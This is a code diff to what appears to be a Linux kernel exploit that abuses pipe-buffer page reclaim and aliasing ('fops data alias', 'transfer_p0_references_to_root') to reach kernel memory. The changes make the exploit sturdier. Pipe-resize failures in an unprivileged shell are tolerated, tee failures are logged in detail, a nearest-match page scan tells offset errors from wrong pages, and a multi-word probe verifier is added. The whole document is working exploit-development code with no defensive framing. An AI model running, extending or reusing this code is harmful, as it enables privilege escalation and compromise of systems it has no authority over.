@@ -88,21 +88,39 @@ void init_ctx(struct mm_ctx *ctx, size_t cnt) {
   ctx->memfds = calloc(sizeof(int), cnt);
 }
 
-void resize_pipe_slots(int pipefd[2], size_t slots) {
-  SYSCHK(fcntl(pipefd[0], F_SETPIPE_SZ, slots * PAGE_SIZE));
+int resize_pipe_slots(int pipefd[2], size_t slots) {
+  /* NOTE: F_SETPIPE_SZ returns the new size in bytes (>0) on success,
+   * -1 on failure. Never compare against 0. */
+  if (fcntl(pipefd[0], F_SETPIPE_SZ, slots * PAGE_SIZE) == -1) {
+    int resize_errno = errno;
+    /* Shell context lacks CAP_SYS_RESOURCE; oversized or racy resizes must
+     * degrade to the current pipe size instead of aborting the run.
+     * Geometry drift (e.g. 32 slots assumed vs 16 actual) is observable
+     * downstream via gate behavior; blocking-write stall risk accepted
+     * (writes here are paired with readers). */
+    errno = 0;
+    int actual = fcntl(pipefd[0], F_GETPIPE_SZ);
+    int actual_errno = errno;
+    pr_warning("resize_pipe_slots slots=%zu errno=%d actual=%d "
+               "actual_errno=%d; continuing\n",
+               slots, resize_errno, actual, actual_errno);
+    errno = resize_errno;
+    return -1;
+  }
+  return 0;
 }
 
 void make_pipe_object(int pipefd[2]) {
   SYSCHK(pipe(pipefd));
-  resize_pipe_slots(pipefd, 2);
+  (void)resize_pipe_slots(pipefd, 2);
 }
 
 void alloc_pipe_object(int pipefd[2]) {
-  resize_pipe_slots(pipefd, PIPE_BUFFER_SLOTS);
+  (void)resize_pipe_slots(pipefd, PIPE_BUFFER_SLOTS);
 }
 
 void free_pipe_object(int pipefd[2]) {
-  resize_pipe_slots(pipefd, 2);
+  (void)resize_pipe_slots(pipefd, 2);
 }
 
 uintptr_t prepare_pipe_buffer_page_child(void) {
@@ -895,13 +913,12 @@ static int pipe_read_full(int fd, void *data, size_t size) {
   return 1;
 }
 
-static int pipe_duplicate_bytes(
+static ssize_t pipe_duplicate_bytes(
     int source_fd, int holder[2], size_t size, size_t slots) {
   SYSCHK(pipe(holder));
-  resize_pipe_slots(holder, slots);
+  (void)resize_pipe_slots(holder, slots);
   errno = 0;
-  ssize_t duplicated = syscall(SYS_tee, source_fd, holder[1], size, 0);
-  return duplicated == (ssize_t)size;
+  return syscall(SYS_tee, source_fd, holder[1], size, 0);
 }
 
 static int transfer_p0_references_to_root(int retained_pipe_index) {
@@ -1088,10 +1105,18 @@ int verify_p0_pipe_oracle_gate(void) {
   p0_gate_holders_initialized = 1;
 #endif
   for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
-    if (!pipe_duplicate_bytes(pipe_fds_reclaim[pipe_index][0],
-                              p0_gate_holders[pipe_index], PAGE_SIZE, 1)) {
-      pr_warning("p0 gate tee failed pipe=%zu errno=%d\n",
-                 pipe_index, errno);
+    errno = 0;
+    ssize_t tee_ret = pipe_duplicate_bytes(pipe_fds_reclaim[pipe_index][0],
+                                           p0_gate_holders[pipe_index],
+                                           PAGE_SIZE, 1);
+    int tee_errno = errno;
+    if (tee_ret != (ssize_t)PAGE_SIZE) {
+      errno = 0;
+      int src_sz = fcntl(pipe_fds_reclaim[pipe_index][0], F_GETPIPE_SZ);
+      int src_sz_errno = errno;
+      pr_warning("p0 gate tee failed pipe=%zu ret=%zd errno=%d "
+                 "src_sz=%d src_sz_errno=%d\n",
+                 pipe_index, tee_ret, tee_errno, src_sz, src_sz_errno);
       spawn_p0_ref_keeper(-1);
       return 0;
     }
@@ -1185,17 +1210,155 @@ int verify_p0_pipe_data_page(uintptr_t target, uint64_t expected) {
     if (observed == expected) {
       exact_matches++;
     }
+    /* Nearest-match forensics (logging only): scan the page for the
+     * expected word to distinguish off-by-N (fixable offset) from a
+     * wrong page. Also dump the neighborhood of the target offset. */
+    long nearest_off = -1;
+    long nearest_dist = 0;
+    {
+      /* NOTE: page is a char array (1-byte aligned); never dereference
+       * it as u64* (UB/strict-aliasing + possible SIGBUS). */
+      for (size_t wi = 0; wi + sizeof(uint64_t) <= sizeof(page); wi++) {
+        uint64_t w = 0;
+        memcpy(&w, page + wi, sizeof(w));
+        if (w == expected) {
+          long off = (long)wi;
+          long dist = off >= (long)target_offset
+                          ? off - (long)target_offset
+                          : (long)target_offset - off;
+          if (nearest_off == -1 || dist < nearest_dist) {
+            nearest_off = off;
+            nearest_dist = dist;
+          }
+        }
+      }
+    }
+    uint64_t win[4] = {0, 0, 0, 0};
+    {
+      size_t base = target_offset >= 16 ? target_offset - 16 : 0;
+      for (size_t k = 0; k < 4; k++) {
+        if (base + k * 8 + sizeof(uint64_t) <= sizeof(page)) {
+          memcpy(&win[k], page + base + k * 8, sizeof(uint64_t));
+        }
+      }
+    }
     pr_info("fops data alias pipe=%zu target=%016zx offset=%zu "
-            "observed=%016llx expected=%016llx match=%d\n",
+            "observed=%016llx expected=%016llx match=%d nearest=%ld "
+            "win=%016llx:%016llx:%016llx:%016llx\n",
             pipe_index, target, target_offset,
             (unsigned long long)observed,
-            (unsigned long long)expected, observed == expected);
+            (unsigned long long)expected, observed == expected, nearest_off,
+            (unsigned long long)win[0], (unsigned long long)win[1],
+            (unsigned long long)win[2], (unsigned long long)win[3]);
   }
   pr_info("fops data alias changed=%d exact=%d target=%016zx "
           "observed=%016llx expected=%016llx\n",
           changed_pages, exact_matches, target,
           (unsigned long long)observed, (unsigned long long)expected);
   if (changed_pages == 1 && exact_matches == 1) {
+    return 1;
+  }
+  return changed_pages == 0 ? 0 : -1;
+}
+
+/* Single-pass multi-word variant. Pair 0 MUST be the fops pair: its log
+ * lines and aggregation are byte-identical to verify_p0_pipe_data_page so
+ * postwrite semantics are preserved. Pairs 1..n-1 are production-touch words
+ * (label != NULL) logged as "bank touch" lines. Pipes are destructive-read,
+ * hence one loop for all pairs. */
+int verify_p0_probe_pairs(struct p0_probe_pair *pairs, size_t n) {
+  unsigned char page[PAGE_SIZE];
+  int changed_pages = 0;
+  size_t k;
+
+  if (!pairs || !n) {
+    return -1;
+  }
+  for (k = 0; k < n; k++) {
+    size_t off = pairs[k].target & (PAGE_SIZE - 1);
+    if (off + sizeof(uint64_t) > sizeof(page)) {
+      return -1;
+    }
+    pairs[k].exact = 0;
+    pairs[k].observed = 0;
+    pairs[k].nearest = -1;
+  }
+  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
+    if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page,
+                        sizeof(page))) {
+      pr_warning("fops data alias read failed pipe=%zu errno=%d\n",
+                 pipe_index, errno);
+      return -1;
+    }
+    if (memcmp(page, "RMG-P0-PIPE", 11) == 0) {
+      continue;
+    }
+    changed_pages++;
+    for (k = 0; k < n; k++) {
+      size_t off = pairs[k].target & (PAGE_SIZE - 1);
+      uint64_t w = 0;
+      long nearest_off = -1;
+      long nearest_dist = 0;
+      uint64_t win[4] = {0, 0, 0, 0};
+      size_t base;
+      size_t j;
+      memcpy(&w, page + off, sizeof(w));
+      pairs[k].observed = w;
+      if (w == pairs[k].expected) {
+        pairs[k].exact++;
+      }
+      for (size_t wi = 0; wi + sizeof(uint64_t) <= sizeof(page); wi++) {
+        uint64_t c = 0;
+        long o;
+        long d;
+        memcpy(&c, page + wi, sizeof(c));
+        if (c != pairs[k].expected) {
+          continue;
+        }
+        o = (long)wi;
+        d = o >= (long)off ? o - (long)off : (long)off - o;
+        if (nearest_off == -1 || d < nearest_dist) {
+          nearest_off = o;
+          nearest_dist = d;
+        }
+      }
+      pairs[k].nearest = nearest_off;
+      base = off >= 16 ? off - 16 : 0;
+      for (j = 0; j < 4; j++) {
+        if (base + j * 8 + sizeof(uint64_t) <= sizeof(page)) {
+          memcpy(&win[j], page + base + j * 8, sizeof(win[j]));
+        }
+      }
+      if (k == 0) {
+        pr_info("fops data alias pipe=%zu target=%016zx offset=%zu "
+                "observed=%016llx expected=%016llx match=%d nearest=%ld "
+                "win=%016llx:%016llx:%016llx:%016llx\n",
+                pipe_index, pairs[k].target, off,
+                (unsigned long long)w,
+                (unsigned long long)pairs[k].expected, w == pairs[k].expected,
+                nearest_off,
+                (unsigned long long)win[0], (unsigned long long)win[1],
+                (unsigned long long)win[2], (unsigned long long)win[3]);
+      } else {
+        pr_info("prod touch pipe=%zu label=%s target=%016zx offset=%zu "
+                "observed=%016llx expected=%016llx match=%d nearest=%ld "
+                "win=%016llx:%016llx:%016llx:%016llx\n",
+                pipe_index, pairs[k].label ? pairs[k].label : "?",
+                pairs[k].target, off,
+                (unsigned long long)w,
+                (unsigned long long)pairs[k].expected, w == pairs[k].expected,
+                nearest_off,
+                (unsigned long long)win[0], (unsigned long long)win[1],
+                (unsigned long long)win[2], (unsigned long long)win[3]);
+      }
+    }
+  }
+  pr_info("fops data alias changed=%d exact=%d target=%016zx "
+          "observed=%016llx expected=%016llx\n",
+          changed_pages, pairs[0].exact, pairs[0].target,
+          (unsigned long long)pairs[0].observed,
+          (unsigned long long)pairs[0].expected);
+  if (changed_pages == 1 && pairs[0].exact == 1) {
     return 1;
   }
   return changed_pages == 0 ? 0 : -1;
